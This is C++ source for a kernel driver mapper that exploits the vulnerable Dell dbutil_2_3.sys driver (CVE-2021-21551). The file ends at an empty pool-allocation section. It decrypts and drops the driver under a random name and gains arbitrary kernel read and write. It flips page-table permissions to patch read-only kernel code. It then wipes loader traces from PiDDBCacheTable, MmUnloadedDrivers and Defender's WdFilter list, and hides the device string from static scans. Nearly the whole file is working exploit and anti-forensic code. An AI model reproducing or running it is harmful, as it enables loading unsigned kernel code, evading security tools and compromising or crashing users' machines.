/*
 * dell_driver.cpp — Dell dbutil_2_3.sys exploitation for driver mapping
 *
 * Replaces intel_driver (iqvw64e.sys) with Dell's BIOS utility driver.
 * CVE-2021-21551: Physical memory R/W via unvalidated IOCTL parameters.
 *
 * Architecture:
 *   Physical IOCTL → Page Table Walk → Virtual R/W → CallKernelFunction → Everything else
 */

#include "dell_driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>
#include <wincrypt.h>
#include <cstdio>

#include "utils.hpp"
#include "dell_driver_resource.hpp"
#include "service.hpp"
#include "nt.hpp"
#include "portable_executable.hpp"

#pragma comment(lib, "advapi32.lib")

// Crash-surviving logger: writes to file and flushes immediately
// Production mode: crash logging disabled (no file created)
void CrashLog(const char*, ...) { }
void dell_driver::CrashLogFromHpp(const char*) { }

/* ══════════════════════════════════════════════════════════════════════
 *  Hardening helpers
 * ══════════════════════════════════════════════════════════════════════ */

static void SecureZero(void* ptr, size_t size) {
	volatile unsigned char* p = (volatile unsigned char*)ptr;
	while (size--) *p++ = 0;
}

static bool CryptoRandBytes(void* buf, DWORD len) {
	HCRYPTPROV hProv = 0;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		return false;
	BOOL ok = CryptGenRandom(hProv, len, (BYTE*)buf);
	CryptReleaseContext(hProv, 0);
	return ok != FALSE;
}

static std::vector<BYTE> DecryptDriverResource() {
	std::vector<BYTE> out(dell_driver_resource::driver_size);
	for (unsigned int i = 0; i < dell_driver_resource::driver_size; i++)
		out[i] = dell_driver_resource::driver[i] ^ dell_driver_resource::xor_key[i % 32];
	return out;
}

static ULONG RandomPoolTag() {
	ULONG tag = 0;
	if (!CryptoRandBytes(&tag, sizeof(tag)))
		tag = (ULONG)(__rdtsc() & 0xFFFFFFFF);
	// Ensure all bytes are printable ASCII (0x20-0x7E) to look like a real tag
	for (int i = 0; i < 4; i++) {
		BYTE b = ((BYTE*)&tag)[i];
		((BYTE*)&tag)[i] = 0x41 + (b % 26); // A-Z
	}
	return tag;
}

/* ══════════════════════════════════════════════════════════════════════
 *  IOCTL buffer structure for dbutil_2_3.sys
 *
 *  The driver uses METHOD_NEITHER IOCTLs. The input buffer contains
 *  a kernel virtual address and a value field. Reads return data
 *  in-place; writes consume the value field.
 *
 *  Access granularity: 1, 2, or 4 bytes per IOCTL call.
 *  We loop with 4-byte (DWORD) operations for bulk transfers.
 * ══════════════════════════════════════════════════════════════════════ */

// Real CVE-2021-21551 buffer layout (4 QWORDs = 0x20 bytes):
// Metasploit PoC: ULONG_PTR Request[4] = { 0, addr, 0, value };
// +0x00 Unused0, +0x08 Address, +0x10 Unused1, +0x18 Value (QWORD in/out)
// The driver always transfers a full QWORD — there is NO size field.
typedef struct _DELL_IO {
	ULONG64 Unused0;   // +0x00
	ULONG64 Address;   // +0x08  kernel virtual/physical address
	ULONG64 Unused1;   // +0x10
	ULONG64 Value;     // +0x18  in/out value (always QWORD)
} DELL_IO, *PDELL_IO;
static_assert(sizeof(DELL_IO) == 0x20, "DELL_IO must be 0x20 bytes");

/* ══════════════════════════════════════════════════════════════════════
 *  Global state
 * ══════════════════════════════════════════════════════════════════════ */

HANDLE  dell_driver::hDevice       = 0;
ULONG64 dell_driver::ntoskrnlAddr  = 0;
static uint64_t pteBase            = 0;
static std::string cachedDriverName = "";

/* ══════════════════════════════════════════════════════════════════════
 *  Driver name / path helpers
 * ══════════════════════════════════════════════════════════════════════ */

std::wstring dell_driver::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		char buffer[100]{};
		static const char alphanum[] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		BYTE randBytes[32];
		if (CryptoRandBytes(randBytes, sizeof(randBytes))) {
			int len = 10 + (randBytes[0] % 20);
			for (int i = 0; i < len; ++i)
				buffer[i] = alphanum[randBytes[1 + (i % 31)] % (sizeof(alphanum) - 1)];
		} else {
			int len = rand() % 20 + 10;
			for (int i = 0; i < len; ++i)
				buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
		}
		cachedDriverName = buffer;
	}
	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
	return name;
}

std::wstring dell_driver::GetDriverPath() {
	std::wstring temp = kdmUtils::GetFullTempPath();
	if (temp.empty()) return L"";
	return temp + L"\\" + GetDriverNameW();
}

/* ══════════════════════════════════════════════════════════════════════
 *  IOCTL buffer layout — uses DELL_IO struct directly
 *
 *  CVE-2021-21551 well-known layout:
 *    +0x00 Unused, +0x08 Address, +0x10 Unused, +0x18 Size, +0x20 Value
 *
 *  ProbeIoctlLayout verifies this works and dumps raw buffer to crash log.
 * ══════════════════════════════════════════════════════════════════════ */

static bool g_layoutVerified = false;

bool dell_driver::ProbeIoctlLayout(uint64_t ntoskrnlBase) {
	if (g_layoutVerified) return true;

	CrashLog("ProbeIoctlLayout: ntoskrnlBase=0x%llX", (unsigned long long)ntoskrnlBase);

	// Read a QWORD from ntoskrnlBase — should return the MZ+PE header QWORD
	DELL_IO io = {};
	io.Address = ntoskrnlBase;

	DWORD br = 0;
	BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRT_READ,
		&io, sizeof(io), &io, sizeof(io), &br, nullptr);

	CrashLog("ProbeIoctlLayout: DeviceIoControl returned %d, br=%u, LastError=%u", (int)ok, (unsigned)br, GetLastError());
	CrashLog("ProbeIoctlLayout: Raw buffer: [0]=0x%llX [1]=0x%llX [2]=0x%llX [3]=0x%llX",
		(unsigned long long)io.Unused0, (unsigned long long)io.Address,
		(unsigned long long)io.Unused1, (unsigned long long)io.Value);

	if (!ok) {
		kdmLog(L"[-] IOCTL_VIRT_READ failed" << std::endl);
		CrashLog("ProbeIoctlLayout: IOCTL failed");
		return false;
	}

	// Value at +0x18 should contain the QWORD read from ntoskrnlBase (MZ signature in low 2 bytes)
	bool valueHasMZ = ((io.Value & 0xFFFF) == IMAGE_DOS_SIGNATURE);
	CrashLog("ProbeIoctlLayout: Value=0x%llX, valueHasMZ=%d", (unsigned long long)io.Value, valueHasMZ);

	if (valueHasMZ) {
		kdmLog(L"[+] IOCTL layout verified (value at +0x18)" << std::endl);
		CrashLog("ProbeIoctlLayout: OK");
		g_layoutVerified = true;
		return true;
	}

	kdmLog(L"[-] IOCTL layout verification failed — check crash_debug.log" << std::endl);
	return false;
}

/* ══════════════════════════════════════════════════════════════════════
 *  Kernel virtual memory primitives (IOCTL wrappers)
 *
 *  Use the DELL_IO struct directly — no offset guessing.
 *  All address validation and crash logging is done here.
 * ══════════════════════════════════════════════════════════════════════ */

static bool IoctlReadQword(uint64_t addr, uint64_t* out) {
	if (!dell_driver::hDevice || !g_layoutVerified) return false;
	if (addr < 0x10000) { CrashLog("IoctlReadQword: BLOCKED null-range addr 0x%llX", (unsigned long long)addr); return false; }
	DELL_IO io = {};
	io.Address = addr;
	DWORD br = 0;
	if (!DeviceIoControl(dell_driver::hDevice, dell_driver::IOCTL_VIRT_READ,
		&io, sizeof(io), &io, sizeof(io), &br, nullptr))
		return false;
	*out = io.Value;
	return true;
}

static bool IoctlReadDword(uint64_t addr, uint32_t* out) {
	uint64_t qw = 0;
	if (!IoctlReadQword(addr, &qw)) return false;
	*out = (uint32_t)(qw & 0xFFFFFFFF);
	return true;
}

static bool IoctlWriteQword(uint64_t addr, uint64_t value) {
	if (!dell_driver::hDevice || !g_layoutVerified) return false;
	if (addr < 0x10000) { CrashLog("IoctlWriteQword: BLOCKED null-range addr 0x%llX", (unsigned long long)addr); return false; }
	DELL_IO io = {};
	io.Address = addr;
	io.Value = value;
	DWORD br = 0;
	return DeviceIoControl(dell_driver::hDevice, dell_driver::IOCTL_VIRT_WRITE,
		&io, sizeof(io), &io, sizeof(io), &br, nullptr) != FALSE;
}

static bool IoctlWriteDword(uint64_t addr, uint32_t value) {
	return IoctlWriteQword(addr, value);
}

static bool IoctlReadByte(uint64_t addr, uint8_t* out) {
	uint64_t qw = 0;
	if (!IoctlReadQword(addr, &qw)) return false;
	*out = (uint8_t)(qw & 0xFF);
	return true;
}

static bool IoctlWriteByte(uint64_t addr, uint8_t value) {
	return IoctlWriteQword(addr, value);
}

// Physical memory write — bypasses page table permissions and TLB entirely
static bool IoctlWritePhysQword(uint64_t physAddr, uint64_t value) {
	if (!dell_driver::hDevice || !g_layoutVerified) return false;
	if (physAddr < 0x1000) { CrashLog("IoctlWritePhysQword: BLOCKED null-range PA 0x%llX", (unsigned long long)physAddr); return false; }
	DELL_IO io = {};
	io.Address = physAddr;
	io.Value = value;
	DWORD br = 0;
	return DeviceIoControl(dell_driver::hDevice, dell_driver::IOCTL_PHYS_WRITE,
		&io, sizeof(io), &io, sizeof(io), &br, nullptr) != FALSE;
}

static bool IoctlWritePhysDword(uint64_t physAddr, uint32_t value) {
	return IoctlWritePhysQword(physAddr, value);
}

static bool IoctlWritePhysByte(uint64_t physAddr, uint8_t value) {
	return IoctlWritePhysQword(physAddr, value);
}

// Write to a physical address — DWORD-at-a-time with byte alignment
static bool WritePhysicalMemory(uint64_t physAddr, void* buffer, uint64_t size) {
	if (!physAddr || !buffer || !size) return false;
	uint8_t* src = (uint8_t*)buffer;
	uint64_t offset = 0;

	while (offset < size && (physAddr + offset) % 4 != 0) {
		if (!IoctlWritePhysByte(physAddr + offset, src[offset])) return false;
		offset++;
	}
	while (offset + 4 <= size) {
		uint32_t dw;
		memcpy(&dw, src + offset, 4);
		if (!IoctlWritePhysDword(physAddr + offset, dw)) return false;
		offset += 4;
	}
	while (offset < size) {
		if (!IoctlWritePhysByte(physAddr + offset, src[offset])) return false;
		offset++;
	}
	return true;
}

/* ══════════════════════════════════════════════════════════════════════
 *  Virtual memory operations — direct IOCTL to kernel virtual addresses
 *
 *  No page table walk or CR3 needed; the Dell driver IOCTLs accept
 *  kernel virtual addresses directly.
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	// The Dell driver always reads a full QWORD from QWORD-aligned addresses.
	// We must align our reads and extract only the bytes we need.
	uint8_t* dst = (uint8_t*)buffer;
	uint64_t offset = 0;

	while (offset < size) {
		uint64_t curAddr = address + offset;
		uint64_t aligned = curAddr & ~7ULL;         // QWORD-align down
		uint64_t byteOff = curAddr - aligned;       // offset within QWORD
		uint64_t qw = 0;
		if (!IoctlReadQword(aligned, &qw)) return false;

		uint64_t avail = 8 - byteOff;               // bytes available in this QWORD
		uint64_t toCopy = min(avail, size - offset);
		memcpy(dst + offset, (uint8_t*)&qw + byteOff, (size_t)toCopy);
		offset += toCopy;
	}

	return true;
}

bool dell_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	// The Dell driver always writes a full QWORD to QWORD-aligned addresses.
	// To avoid corrupting adjacent bytes, we do read-modify-write:
	//   1. Read the original QWORD from the aligned address
	//   2. Patch only the bytes we want to change
	//   3. Write the full QWORD back
	uint8_t* src = (uint8_t*)buffer;
	uint64_t offset = 0;

	while (offset < size) {
		uint64_t curAddr = address + offset;
		uint64_t aligned = curAddr & ~7ULL;
		uint64_t byteOff = curAddr - aligned;
		uint64_t avail = 8 - byteOff;
		uint64_t toPatch = min(avail, size - offset);

		uint64_t qw = 0;
		// If we're writing a full QWORD at an aligned address, skip the read
		if (byteOff == 0 && toPatch == 8) {
			memcpy(&qw, src + offset, 8);
		} else {
			// Read-modify-write
			if (!IoctlReadQword(aligned, &qw)) return false;
			memcpy((uint8_t*)&qw + byteOff, src + offset, (size_t)toPatch);
		}

		if (!IoctlWriteQword(aligned, qw)) return false;
		offset += toPatch;
	}

	return true;
}

/* ══════════════════════════════════════════════════════════════════════
 *  PTE manipulation for writing to read-only kernel memory
 *
 *  On Windows with KPTI, each user↔kernel transition reloads CR3,
 *  flushing kernel TLB entries. So: modify PTE via one IOCTL call,
 *  return to user, then write via another IOCTL call — the second
 *  call will see the updated (writable) PTE.
 * ══════════════════════════════════════════════════════════════════════ */

#define PTE_RW_BIT       (1ULL << 1)
#define PDE_PS_BIT       (1ULL << 7)   // Page Size: 1 = 2MB large page
#define PTE_PFN_MASK     0x000FFFFFFFFFF000ULL
#define VA_SHIFT_MASK    0x7FFFFFFFF8ULL  // 39-bit range, 8-byte aligned

// Correct Windows self-referencing page table address formulas.
// MiGetPteAddress:  PTE_BASE + ((VA >> 9) & 0x7FFFFFFFF8)
// MiGetPdeAddress:  apply MiGetPteAddress to its own result (recursive)
static uint64_t GetPteVa(uint64_t va) {
	return pteBase + ((va >> 9) & VA_SHIFT_MASK);
}
static uint64_t GetPdeVa(uint64_t va) {
	return GetPteVa(GetPteVa(va));
}

static bool FindPteBase() {
	if (pteBase) return true;
	if (!dell_driver::ntoskrnlAddr) return false;

	BYTE headers[0x1000];
	if (!dell_driver::ReadMemory(dell_driver::ntoskrnlAddr, headers, 0x1000))
		return false;

	ULONG textSize = 0;
	uintptr_t textSection = (uintptr_t)kdmUtils::FindSection(".text", (uintptr_t)headers, &textSize);
	if (!textSection || !textSize) return false;
	uint64_t textVA = textSection - (uintptr_t)headers + dell_driver::ntoskrnlAddr;

	auto isValidCandidate = [](uint64_t v) -> bool {
		return v > 0xFFFF000000000000ULL && (v & 0x7) == 0;
	};

	/*
	 * Pass 1: Original proven patterns — shr rcx/rax, 9 + mov rax/rcx, imm64
	 * immediately adjacent (6 bytes). Works on Win10 1607 through Win11 24H2.
	 * NO validation needed — these tight patterns have near-zero false positives.
	 */
	{
		struct PteSig { BYTE bytes[6]; };
		PteSig sigs[] = {
			{{ 0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8 }},  // shr rcx,9 ; mov rax,imm64
			{{ 0x48, 0xC1, 0xE8, 0x09, 0x48, 0xB9 }},  // shr rax,9 ; mov rcx,imm64
			{{ 0x48, 0xC1, 0xE8, 0x09, 0x48, 0xB8 }},  // shr rax,9 ; mov rax,imm64
			{{ 0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB9 }},  // shr rcx,9 ; mov rcx,imm64
		};
		constexpr size_t sigLen = 6;
		constexpr int sigCount = sizeof(sigs) / sizeof(sigs[0]);

		const uint64_t chunkSz = 0x100000;
		const uint64_t overlap = 16;
		for (uint64_t off = 0; off < textSize; off += (chunkSz - overlap)) {
			uint64_t readSz = min((uint64_t)chunkSz, (uint64_t)textSize - off);
			auto chunk = std::make_unique<BYTE[]>((size_t)readSz);
			if (!dell_driver::ReadMemory(textVA + off, chunk.get(), readSz))
				continue;

			for (uint64_t i = 0; i + sigLen + 8 <= readSz; i++) {
				for (int s = 0; s < sigCount; s++) {
					if (memcmp(chunk.get() + i, sigs[s].bytes, sigLen) == 0) {
						uint64_t candidate = *(uint64_t*)(chunk.get() + i + sigLen);
						if (isValidCandidate(candidate)) {
							pteBase = candidate;
							kdmLog(L"[+] PTE base: 0x" << std::hex << pteBase
								<< L" (pass 1, pattern " << std::dec << (s + 1) << L")" << std::endl);
							return true;
						}
					}
				}
			}
		}
	}

	/*
	 * Pass 2: Expanded tight patterns — additional registers (rdx, rbx, rsi, rdi, r8-r15).
	 * Still immediately adjacent. For Win11 25H2+ compiler output variations.
	 */
	{
		// shr r64,9: REX.W(48/49) C1 E8+reg 09
		// mov r64,imm64: REX.W(48/49) B8+reg
		const uint64_t chunkSz = 0x100000;
		const uint64_t overlap = 16;
		for (uint64_t off = 0; off < textSize; off += (chunkSz - overlap)) {
			uint64_t readSz = min((uint64_t)chunkSz, (uint64_t)textSize - off);
			auto chunk = std::make_unique<BYTE[]>((size_t)readSz);
			if (!dell_driver::ReadMemory(textVA + off, chunk.get(), readSz))
				continue;

			for (uint64_t i = 0; i + 14 <= readSz; i++) {
				BYTE* p = chunk.get() + i;
				// Check for shr r64, 9 (4 bytes)
				if ((p[0] != 0x48 && p[0] != 0x49) || p[1] != 0xC1) continue;
				BYTE m = p[2];
				if (!(m >= 0xE8 && m <= 0xEF)) continue;  // shr only
				if (p[3] != 0x09) continue;
				// Check for immediately following mov r64, imm64 (2 bytes prefix)
				if ((p[4] != 0x48 && p[4] != 0x49)) continue;
				if (!(p[5] >= 0xB8 && p[5] <= 0xBF)) continue;
				uint64_t candidate = *(uint64_t*)(p + 6);
				if (isValidCandidate(candidate)) {
					pteBase = candidate;
					kdmLog(L"[+] PTE base: 0x" << std::hex << pteBase
						<< L" (pass 2, .text+0x" << std::hex << (off + i) << L")" << std::endl);
					return true;
				}
			}
		}
	}

	kdmLog(L"[-] PTE base not found with any patterns" << std::endl);
	return false;
}

bool dell_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	if (!FindPteBase()) {
		kdmLog(L"[-] FATAL: PTE base not found" << std::endl);
		return false;
	}

	// Strategy: For each page spanned by the write:
	//   1. Read the PDE (or PTE for 4KB pages)
	//   2. Set the RW bit via virtual write
	//   3. Write the actual data via virtual write
	//   4. Restore the original PDE/PTE

	uint8_t* src = (uint8_t*)buffer;
	uint64_t remaining = size;
	uint64_t currentAddr = address;

	while (remaining > 0) {
		uint64_t pdeAddr = GetPdeVa(currentAddr);
		uint64_t pde = 0;
		if (!ReadMemory(pdeAddr, &pde, 8)) {
			kdmLog(L"[-] Failed to read PDE at 0x" << std::hex << pdeAddr << std::endl);
			return false;
		}

		uint64_t pageSize;
		uint64_t pageOffset;
		uint64_t pteAddr = 0;
		uint64_t origEntry = 0;
		uint64_t entryAddr = 0;

		if (pde & PDE_PS_BIT) {
			// 2MB large page — modify PDE RW bit
			pageSize = 0x200000;
			pageOffset = currentAddr & 0x1FFFFF;
			entryAddr = pdeAddr;
			origEntry = pde;

			if (!(pde & PTE_RW_BIT)) {
				uint64_t rwPde = pde | PTE_RW_BIT;
				if (!WriteMemory(pdeAddr, &rwPde, 8)) {
					kdmLog(L"[-] Failed to set PDE RW bit" << std::endl);
					return false;
				}
			}
		} else {
			// 4KB page — modify PTE RW bit
			pteAddr = GetPteVa(currentAddr);
			uint64_t pte = 0;
			if (!ReadMemory(pteAddr, &pte, 8)) {
				kdmLog(L"[-] Failed to read PTE at 0x" << std::hex << pteAddr << std::endl);
				return false;
			}
			pageSize = 0x1000;
			pageOffset = currentAddr & 0xFFF;
			entryAddr = pteAddr;
			origEntry = pte;

			if (!(pte & PTE_RW_BIT)) {
				uint64_t rwPte = pte | PTE_RW_BIT;
				if (!WriteMemory(pteAddr, &rwPte, 8)) {
					kdmLog(L"[-] Failed to set PTE RW bit" << std::endl);
					return false;
				}
			}
		}

		uint64_t chunkSize = min(remaining, pageSize - pageOffset);

		// Write the actual data now that page is writable
		if (!WriteMemory(currentAddr, src, (uint64_t)chunkSize)) {
			kdmLog(L"[-] Virtual write failed at 0x" << std::hex << currentAddr << std::endl);
			// Restore original entry before failing
			WriteMemory(entryAddr, &origEntry, 8);
			return false;
		}

		// Restore original PDE/PTE (removes RW bit if it wasn't set)
		if (!(origEntry & PTE_RW_BIT)) {
			WriteMemory(entryAddr, &origEntry, 8);
		}

		src += chunkSize;
		currentAddr += chunkSize;
		remaining -= chunkSize;
	}

	return true;
}

bool dell_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return false;

	// For kernel-to-kernel copies, read into temp buffer then write out
	auto temp = std::make_unique<uint8_t[]>(size);
	if (!ReadMemory(source, temp.get(), size))
		return false;
	return WriteMemory(destination, temp.get(), size);
}

bool dell_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return false;

	auto temp = std::make_unique<uint8_t[]>(size);
	memset(temp.get(), (uint8_t)value, size);
	return WriteMemory(address, temp.get(), size);
}

bool dell_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
	if (!address || !out_physical_address)
		return false;
	if (!FindPteBase())
		return false;
	uint64_t pteAddr = pteBase + ((address >> 12) << 3);
	uint64_t pte = 0;
	if (!ReadMemory(pteAddr, &pte, 8) || !(pte & 1))
		return false;
	*out_physical_address = (pte & PTE_PFN_MASK) + (address & 0xFFF);
	return true;
}

uint64_t dell_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	static uint64_t kernel_MmMapIoSpace = GetKernelModuleExport(ntoskrnlAddr, "MmMapIoSpace");
	if (!kernel_MmMapIoSpace)
		return 0;

	uint64_t mapped = 0;
	// MmNonCached = 0
	CallKernelFunction(&mapped, kernel_MmMapIoSpace, physical_address, size, (uint32_t)0);
	return mapped;
}

bool dell_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	static uint64_t kernel_MmUnmapIoSpace = GetKernelModuleExport(ntoskrnlAddr, "MmUnmapIoSpace");
	if (!kernel_MmUnmapIoSpace)
		return false;

	return CallKernelFunction<void>(nullptr, kernel_MmUnmapIoSpace, address, size);
}

/* ══════════════════════════════════════════════════════════════════════
 *  Driver lifecycle
 * ══════════════════════════════════════════════════════════════════════ */

bool dell_driver::IsRunning() {
	wchar_t devPath[20];
	devPath[0]=L'\\'; devPath[1]=L'\\'; devPath[2]=L'.'; devPath[3]=L'\\';
	devPath[4]=L'D'; devPath[5]=L'B'; devPath[6]=L'U'; devPath[7]=L't';
	devPath[8]=L'i'; devPath[9]=L'l'; devPath[10]=L'_'; devPath[11]=L'2';
	devPath[12]=L'_'; devPath[13]=L'3'; devPath[14]=L'\0';
	const HANDLE file_handle = CreateFileW(devPath, FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

NTSTATUS dell_driver::AcquireDebugPrivilege() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
		return STATUS_UNSUCCESSFUL;

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		kdmLog("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}

NTSTATUS dell_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	// Runtime-constructed device path to avoid plaintext string in binary
	wchar_t devPath[20];
	devPath[0]=L'\\'; devPath[1]=L'\\'; devPath[2]=L'.'; devPath[3]=L'\\';
	devPath[4]=L'D'; devPath[5]=L'B'; devPath[6]=L'U'; devPath[7]=L't';
	devPath[8]=L'i'; devPath[9]=L'l'; devPath[10]=L'_'; devPath[11]=L'2';
	devPath[12]=L'_'; devPath[13]=L'3'; devPath[14]=L'\0';

	bool alreadyRunning = dell_driver::IsRunning();

	if (!alreadyRunning) {
		kdmLog(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

		std::wstring driver_path = GetDriverPath();
		if (driver_path.empty()) {
			kdmLog(L"[-] Can't find TEMP folder" << std::endl);
			return STATUS_UNSUCCESSFUL;
		}

		_wremove(driver_path.c_str());

		auto decrypted = DecryptDriverResource();
		if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(decrypted.data()), decrypted.size())) {
			SecureZero(decrypted.data(), decrypted.size());
			kdmLog(L"[-] Failed to create vulnerable driver file" << std::endl);
			return STATUS_DISK_OPERATION_FAILED;
		}
		SecureZero(decrypted.data(), decrypted.size());
		decrypted.clear();

		auto status = AcquireDebugPrivilege();
		if (!NT_SUCCESS(status)) {
			kdmLog(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
			_wremove(driver_path.c_str());
			return status;
		}

		status = service::RegisterAndStart(driver_path, GetDriverNameW());
		if (!NT_SUCCESS(status)) {
			kdmLog(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
			_wremove(driver_path.c_str());
			return status;
		}
	} else {
		kdmLog(L"[~] DBUtil_2_3 already loaded, reusing existing device" << std::endl);
	}

	CrashLog("Load: opening device");
	hDevice = CreateFileW(devPath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
		kdmLog(L"[-] Failed to open DBUtil_2_3 device" << std::endl);
		if (!alreadyRunning) dell_driver::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
	CrashLog("Load: ntoskrnlAddr=0x%llX", (unsigned long long)ntoskrnlAddr);
	if (ntoskrnlAddr == 0) {
		kdmLog(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		dell_driver::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	// Verify IOCTL buffer layout
	CrashLog("Load: calling ProbeIoctlLayout");
	if (!ProbeIoctlLayout(ntoskrnlAddr)) {
		kdmLog(L"[-] FATAL: Cannot detect IOCTL buffer layout for this driver build" << std::endl);
		dell_driver::Unload();
		return STATUS_INVALID_DEVICE_REQUEST;
	}

	// Verify we can read ntoskrnl via virtual address IOCTL
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!ReadMemory(ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		kdmLog(L"[-] Can't read kernel via IOCTL (e_magic=0x" << std::hex << dosHeader.e_magic << L")" << std::endl);
		dell_driver::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	CrashLog("Load: kernel read verified");
	kdmLog(L"[+] Kernel read verified at 0x" << std::hex << ntoskrnlAddr << std::endl);

	// Pre-flight: verify PTE base discovery and write capability BEFORE any CallKernelFunction
	if (!FindPteBase()) {
		kdmLog(L"[-] FATAL: PTE base not found — CallKernelFunction would BSOD" << std::endl);
		kdmLog(L"[-] WriteToReadOnlyMemory requires PTE manipulation to hook NtAddAtom" << std::endl);
		dell_driver::Unload();
		return STATUS_NOT_SUPPORTED;
	}
	CrashLog("Load: PTE base verified");
	kdmLog(L"[+] PTE base verified" << std::endl);

	// Pre-flight: verify PTE-based write-to-read-only works
	CrashLog("Load: starting WriteToReadOnlyMemory pre-flight");
	{
		// Read original MZ header bytes, write them back via PTE manipulation
		uint32_t originalDword = 0;
		if (!ReadMemory(ntoskrnlAddr, &originalDword, 4) || (originalDword & 0xFFFF) != IMAGE_DOS_SIGNATURE) {
			kdmLog(L"[-] FATAL: Cannot read ntoskrnl for write test" << std::endl);
			dell_driver::Unload();
			return STATUS_ACCESS_DENIED;
		}
		// Write the same bytes back (safe — no modification)
		if (!WriteToReadOnlyMemory(ntoskrnlAddr, &originalDword, 4)) {
			kdmLog(L"[-] FATAL: WriteToReadOnlyMemory pre-flight failed" << std::endl);
			dell_driver::Unload();
			return STATUS_ACCESS_DENIED;
		}
		// Verify round-trip
		uint32_t verifyDword = 0;
		if (!ReadMemory(ntoskrnlAddr, &verifyDword, 4) || verifyDword != originalDword) {
			kdmLog(L"[-] FATAL: Write verify failed (wrote 0x" << std::hex << originalDword
				<< L" read back 0x" << verifyDword << L")" << std::endl);
			dell_driver::Unload();
			return STATUS_DATA_ERROR;
		}
		CrashLog("Load: WriteToReadOnlyMemory pre-flight OK");
		kdmLog(L"[+] WriteToReadOnlyMemory verified OK" << std::endl);
	}

	// Trace cleanup only needed when we loaded the driver ourselves
	if (!alreadyRunning) {
		CrashLog("Load: starting trace cleanup (ClearPiDDB)");
		if (!dell_driver::ClearPiDDBCacheTable()) {
			kdmLog(L"[!] Failed to ClearPiDDBCacheTable (non-fatal)" << std::endl);
		}

		CrashLog("Load: ClearKernelHashBucketList");
		if (!dell_driver::ClearKernelHashBucketList()) {
			kdmLog(L"[!] Failed to ClearKernelHashBucketList (non-fatal)" << std::endl);
		}

		CrashLog("Load: ClearMmUnloadedDrivers");
		if (!dell_driver::ClearMmUnloadedDrivers()) {
			kdmLog(L"[!] Failed to ClearMmUnloadedDrivers (non-fatal)" << std::endl);
		}

		CrashLog("Load: ClearWdFilterDriverList");
		if (!dell_driver::ClearWdFilterDriverList()) {
			kdmLog("[!] Failed to ClearWdFilterDriverList (non-fatal)" << std::endl);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS dell_driver::Unload() {
	kdmLog(L"[+] Unloading driver\n" << std::endl);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = 0;
	}

	// Reset state so next Load() re-probes
	g_layoutVerified = false;
	pteBase = 0;

	auto status = service::StopAndRemove(GetDriverNameW());
	if (!NT_SUCCESS(status))
		return status;

	std::wstring driver_path = GetDriverPath();

	// Overwrite disk contents with random data before unlinking
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	if (!file_ofstream.is_open()) {
		kdmLog(L"[!] Error opening driver file to overwrite" << std::endl);
		return STATUS_DELETE_PENDING;
	}

	ULONG64 randPad = 0;
	CryptoRandBytes(&randPad, sizeof(randPad));
	int newFileLen = dell_driver_resource::driver_size + (int)(randPad % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	CryptoRandBytes(randomData, newFileLen);
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		kdmLog(L"[!] Error overwriting driver data" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	if (_wremove(driver_path.c_str()) != 0)
		return STATUS_DELETE_PENDING;

	pteBase = 0;
	return STATUS_SUCCESS;
}

/* ══════════════════════════════════════════════════════════════════════
 *  Kernel pool allocation
 * ══════════════════════════════════════════════════════════════════════ */

